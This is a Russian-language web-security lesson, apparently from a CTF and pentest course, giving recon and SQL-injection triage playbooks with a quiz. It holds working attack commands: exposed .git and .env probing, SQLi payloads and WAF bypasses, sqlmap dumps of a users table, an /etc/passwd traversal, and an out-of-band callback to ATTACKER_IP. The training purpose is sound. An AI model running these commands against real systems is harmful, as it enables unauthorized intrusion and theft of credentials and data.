---
id: web-playbooks-recon
title: "Плейбуки разведки: от URL до триажа инъекции"
category: web
parent: web-playbooks
difficulty: medium
order: 1
tags: [playbook, recon, discovery, triage, injection, decision-tree, web]
prerequisites: [web-playbooks, web-tooling]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
  - "Пентест веб-приложений"
estimated_minutes: 40
summary: "Два decision-tree плейбука раннего этапа: от одного URL до первого foothold и триаж подозрительной инъекции до дампа данных."
---

Разведка веб-приложения — это не «запустить сканер», а **последовательность дешёвых проверок, каждая из которых либо даёт foothold, либо закрывает ветку**. Ошибка в порядке действий стоит дороже всего: час на SQLi, когда доступ лежал в `/.git/config`; остановка на «сервер вернул 500», хотя это была инъекция; брутфорс `rockyou` по форме логина, где пароль — `admin`. Этот урок — рабочий плейбук раннего этапа: два дерева решений с конкретными командами и условиями перехода.

## Принципы раннего этапа

Три правила задают весь маршрут.

1. **Сначала дешёвое, потом дорогое.** Стоимость = время × риск обнаружения. `robots.txt`, `.git`, дефолтные креды, Swagger — секунды; time-based SQLi, брутфорс, OOB — минуты и шум.
2. **Один шаг — один артефакт.** Каждая проверка заканчивается либо доказательством (файл, токен, ответ БД), либо записанным отрицательным результатом. «Похоже, не работает» — не результат.
3. **Дерево, а не список.** На каждом узле есть условие ветвления: что означает ответ. Нет движения за N попыток — возврат на уровень выше и соседняя ветка.

## Дерево 1: от URL до первого foothold

Точка входа — один URL цели. Порядок проверок:

| Шаг | Команда (пример) | Условие ветвления |
|-----|------------------|-------------------|
| Стек и заголовки | `httpx -u https://t -sc -td -server` | версия фреймворка → CVE-ветка |
| robots/sitemap | `curl -s https://t/robots.txt` | скрытые пути → дискавери |
| Открытые артефакты | `curl -sI https://t/.git/HEAD` | 200 → дамп репозитория |
| Конфиги | `curl -sI https://t/.env` | 200 → креды/ключи |
| API-доки | `curl -s https://t/openapi.json` | 200 → карта эндпоинтов |
| Админка | `curl -sI https://t/admin` | 200/401/403 → auth-ветка |
| Форма логина | ручной ввод | → дефолтные креды |
| Дискавери | `ffuf -w list -u https://t/FUZZ` | новые пути → повторить |

Первая половина — «низковисящие фрукты»:

```bash
# 1. стек и версии одним запросом
httpx -u https://target.local -sc -td -title -server -tech-detect

# 2. открытый git — самое частое, что пропускают
curl -s -o /dev/null -w '%{http_code}\n' https://target.local/.git/HEAD   # 200 -> есть
curl -s https://target.local/.git/config

# 3. окружение и бэкапы
for p in .env .env.bak config.php.bak backup.zip db.sql robots.txt; do
  curl -so /dev/null -w "%{http_code} $p\n" "https://target.local/$p"
done

# 4. API-документация
curl -s https://target.local/swagger.json | jq '.paths | keys'
```

Если `.git` открыт — дампаем весь репозиторий и ищем секреты:

```bash
git-dumper https://target.local/.git/ ./repo
cd repo && git log --oneline | head && grep -rniE 'password|secret|api[_-]?key' .
```

## Дерево 2: триаж подозрительной инъекции

Точка входа — сигнал: эхо кавычки, ошибка БД, задержка, странное поведение параметра. Не пишите сразу payload — **сначала классифицируйте**.

```bash
# базовый триаж: реакция на кавычку и на true/false
curl -s "https://target.local/item?id=1"           | wc -c   # базовый размер
curl -s "https://target.local/item?id=1'"          | wc -c   # разрыв кавычки
curl -s "https://target.local/item?id=1 AND 1=1-- -" | wc -c # истина
curl -s "https://target.local/item?id=1 AND 1=2-- -" | wc -c # ложь

# error-based: ищем текст ошибки
curl -s "https://target.local/item?id=1'" | grep -iE 'sql|syntax|ORA-|ODBC'

# time-based (5 сек) — не зависит от размера ответа
curl -s -o /dev/null -w '%{time_total}\n' \
  "https://target.local/item?id=1; SELECT SLEEP(5)-- -"
```

Условия перехода:

- **Размер true ≠ false** → boolean-based; переходим к побайтовому извлечению или к `sqlmap`.
- **Есть текст ошибки** → error/union; пробуем `UNION SELECT NULL,NULL`.
- **Время выросло ровно на N сек** → time-based blind; извлекаем побайтово.
- **Ничего не изменилось** → возможно, фильтр или другой контекст: пробуем `0x27`, `char(39)`, `%27`, `%2527`.

Второй уровень — автоматизация подтверждённого кандидата:

```bash
# сохранить запрос из Burp «Copy as cURL» в файл и отдать sqlmap
sqlmap -r request.txt -p id --batch --level=3 --risk=2 --technique=BEUT
sqlmap -r request.txt -p id --batch --dbs        # список баз
sqlmap -r request.txt -p id --batch -D app -T users --dump
```

## Выбор между ветками: таблица решений

| Наблюдение | Наиболее вероятная ветка | Первый шаг |
|-----------|--------------------------|-----------|
| Заголовок `X-Powered-By: Express` + старый `next` | framework CVE | проверить версию и шаблон nuclei |
| `/.git/HEAD` = 200 | утечка исходников | `git-dumper` |
| Ошибка БД в ответе | SQLi error-based | `UNION SELECT` / `sqlmap` |
| Ответ одинаковый, время растёт | time-based SQLi | побайтовое извлечение |
| Параметр `url=`/`file=` | SSRF / LFI | `http://127.0.0.1`, `../../../etc/passwd` |
| JWT в cookie | JWT-ветка | `jwt_tool -M at` |
| `Server: Apache/2.4.49` | path traversal CVE | `/.%2e/` |
| Параметр отражается в HTML | XSS | контекст + `dalfox` |

## Работа с параметрами и контекстом

Один и тот же payload ведёт себя по-разному в query, JSON, заголовке, multipart и cookie. Проверяйте **все** точки входа, а не только видимые поля.

```bash
# query
curl -s "https://t/s?q=test'"
# JSON
curl -s https://t/api -H 'Content-Type: application/json' -d '{"q":"test'"'"'"}'
# заголовок
curl -s https://t/ -H "X-Forwarded-For: 127.0.0.1'"
# cookie
curl -s https://t/ -b "role=user'"
# multipart
curl -s https://t/up -F "name=test'"
```

Отдельно проверяйте **скрытые параметры** — их даёт `arjun` или `param-miner`:

```bash
arjun -u https://target.local/api/item --get -m GET,POST
ffuf -w params.txt -u "https://target.local/api/item?FUZZ=1" -fs 0
```

## OOB и «слепые» каналы

Когда нет ни эха, ни размера, ни задержки — поднимайте внешний канал. Свой listener (DNS/HTTP) превращает невидимую инъекцию в доказательство.

```bash
# слушаем HTTP-коллбэки
python3 -m http.server 8000
# проверяем OOB для SSRF/XXE/RCE
curl -s "https://t/fetch?url=http://ATTACKER_IP:8000/x"
# DNS-канал (Burp Collaborator / interactsh)
interactsh-client -v
```

## Фиксация отрицательных результатов

Ведите журнал: вектор → команда → результат. «`'` в `id` — размер не изменился, ошибки нет, время то же» — это закрытая ветка, к которой не нужно возвращаться. Без журнала вы (и коллеги) повторите тот же путь.

```bash
# минимальный лог в файл
echo "id: quote -> no change, no error, no delay" >> /tmp/lt-notes.txt
```

## Что делать дальше / решение

Действуйте по такому алгоритму:

1. **Определите точку входа** — что у вас на руках: URL, форма, параметр, токен.
2. **Пройдите дешёвые ветки** (`httpx`, `.git`, `.env`, Swagger, robots, дефолтные креды) — за 5–10 минут.
3. **Нашли сигнал инъекции** — классифицируйте (boolean/error/time) и подтвердите одной командой `curl`.
4. **Подтвердили** — доводите до артефакта: дамп данных, `id`, чужой объект, файл.
5. **Нет движения** — фиксируйте отрицательный результат и берите соседнюю ветку дерева.
6. **Тупик на всех ветках** — переходите к соседнему модулю (`web-playbooks-exploit`, `web-playbook-ssrf-to-internal`).

Помните: **подозрение — не находка**. Находка — это воспроизводимый PoC с доказательством. Именно он идёт в отчёт, баг-баунти и зачёт CTF.

## Типичные тупики и как их обойти

- **Фильтр кавычки.** Пробуйте `0x27`, `char(39)`, `%27`, `%2527`, экранирование `\'`, юникод.
- **WAF на `SELECT`/`UNION`.** Регистр `SeLeCt`, комментарии `/**/`, `+`, `%09`, разделение ключевых слов.
- **Пустой ответ на ошибку.** Переходите на boolean/time — размер и задержка не зависят от вывода.
- **Ничего не видно вообще.** OOB-канал (DNS/HTTP) или сравнение состояния сервера (кэш, логи, побочные эффекты).
- **Ложное «нет инъекции».** Один метод не закрывает класс: не сработал UNION — пробуйте error/boolean/time/OOB.

## Инструменты дискавери: флаги и примеры

Контент-дискавери — вторая половина раннего этапа. Ниже — рабочие наборы флагов для трёх основных инструментов.

**ffuf** — самый гибкий: умеет фильтровать по размеру, коду, словам и количеству строк.

```bash
# базовый перебор путей с фильтром «как 404»
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
     -u https://target.local/FUZZ -mc 200,301,302,401,403 -fs 0 -t 40

# vhost-фаззинг: Host: FUZZ.target.local
ffuf -w subs.txt -u https://target.local/ -H 'Host: FUZZ.target.local' -fs 1234

# перебор параметров GET
ffuf -w params.txt -u "https://target.local/api?FUZZ=1" -fs 0

# рекурсивный обход (новые каталоги добавляются в очередь)
ffuf -w dirs.txt -u https://target.local/FUZZ -recursion -recursion-depth 2
```

**gobuster** — простой и быстрый, удобен для dir/dns/vhost в один проход.

```bash
gobuster dir -u https://target.local -w dirs.txt -x php,html,bak,zip -t 50 -q
gobuster vhost -u https://target.local -w subs.txt --append-domain -q
gobuster dns -d target.local -w subs.txt --show-ips -q
```

**feroxbuster** — рекурсивный по умолчанию, с авто-фильтрацией и отчётом.

```bash
feroxbuster -u https://target.local -w dirs.txt -x php,bak -d 3 -t 50 -q \
            --auto-tune --status-codes 200,204,301,302,307,401,403
```

| Инструмент | Сильная сторона | Ключевые флаги |
|-----------|-----------------|----------------|
| ffuf | фильтры, fuzz любых позиций | `-mc -fs -fw -fl -recursion -H` |
| gobuster | простота, dir/dns/vhost | `-x -t -q --append-domain` |
| feroxbuster | рекурсия «из коробки» | `-d -x --auto-tune` |

Обязательно записывайте, какой словарь уже применялся к `host:port` — повторный запуск того же списка не даёт новой информации и только шумит.

## Полный разобранный пример: от URL до дампа

Цель: `https://shop.target.local`. Пройдём маршрут целиком с реальными выводами.

```bash
$ httpx -u https://shop.target.local -sc -title -server -tech-detect
https://shop.target.local [200] [Shop] [nginx/1.18.0] [PHP/7.4, MySQL]
```

Стек: PHP 7.4 + MySQL. Проверяем дешёвые артефакты:

```bash
$ curl -so /dev/null -w '%{http_code} .git\n' https://shop.target.local/.git/HEAD
200 .git
$ git-dumper https://shop.target.local/.git/ ./repo >/dev/null 2>&1
$ grep -rniE 'db_pass|password' repo/config.php
$db_pass = 'S3cr3tP@ss';
```

Дальше — параметр `id` в каталоге:

```bash
$ curl -s "https://shop.target.local/product?id=1" | wc -c
4821
$ curl -s "https://shop.target.local/product?id=1'" | wc -c
0
```

Ответ стал пустым — сильный сигнал разрыва SQL-строки. Подтверждаем boolean:

```bash
$ curl -s "https://shop.target.local/product?id=1 AND 1=1-- -" | wc -c
4821
$ curl -s "https://shop.target.local/product?id=1 AND 1=2-- -" | wc -c
0
```

`true` даёт нормальный размер, `false` — ноль: boolean-based blind подтверждён. Отдаём запрос sqlmap:

```bash
$ sqlmap -r request.txt -p id --batch --dbs
available databases [3]:
[*] information_schema
[*] shop
[*] mysql
$ sqlmap -r request.txt -p id --batch -D shop -T users -C user,password --dump
```

Артефакт получен: дамп таблицы `users`. Маршрут закрыт, можно фиксировать находку.

## Чек-лист раннего этапа

Перед тем как переходить к эксплуатации, убедитесь, что закрыты все дешёвые проверки:

- [ ] Стек и версии зафиксированы (`httpx -td`), версии сверены с CVE.
- [ ] `robots.txt`, `sitemap.xml`, `/.well-known/` прочитаны.
- [ ] `.git`, `.svn`, `.env`, `*.bak`, `*.zip`, `db.sql` проверены.
- [ ] API-доки (`/swagger.json`, `/openapi.json`, `/graphql`) найдены.
- [ ] Админка и форма логина проверены дефолтными кредами.
- [ ] Дискавери выполнен минимум одним словарём (записано, каким).
- [ ] Каждый параметр проверен на инъекцию хотя бы триажем.
- [ ] Отрицательные результаты записаны в журнал.

## Квиз

```quiz
- question: "Что делать ПЕРВЫМ делом, обнаружив форму логина?"
  options:
    - "Писать SQLi-payload в поле пароля"
    - "Проверить дефолтные и типовые креды"
    - "Запускать полный брутфорс rockyou"
    - "Сразу искать SSRF"
  answer: 1
  explanation: "Дешёвая ветка (дефолтные креды) проверяется раньше дорогих техник."
- question: "Сканер показал «возможную инъекцию». Когда это становится находкой?"
  options:
    - "Сразу, как только сканер написал"
    - "Когда воспроизведено вручную одной командой с доказательством"
    - "Только после полного дампа базы"
    - "Никогда, сканерам нельзя верить"
  answer: 1
  explanation: "Подозрение нужно воспроизвести (curl/PoC) — тогда это подтверждённый вектор."
- question: "Ветка плейбука не даёт движения за N попыток. Что делать?"
  options:
    - "Упорно продолжать ту же технику"
    - "Вернуться на уровень выше и взять соседнюю ветку"
    - "Сменить инструмент, но оставить ту же технику"
    - "Считать цель безопасной"
  answer: 1
  explanation: "Плейбук — дерево: при тупике возвращаются к родительскому узлу и идут по другой ветке."
```

## Где пригодится

- **CTF (Web):** когда непонятно, за что взяться, плейбук задаёт порядок шагов и не даёт застрять.
- **Bug bounty:** дисциплина «сначала дешёвое, потом дорогое» экономит время на scope с сотнями хостов.
- **Пентест:** воспроизводимый маршрут легко превращается в отчёт с доказательствами на каждом шаге.
- **Работа (SOC/AppSec):** понимание типичных переходов помогает при триаже и обучении команды.
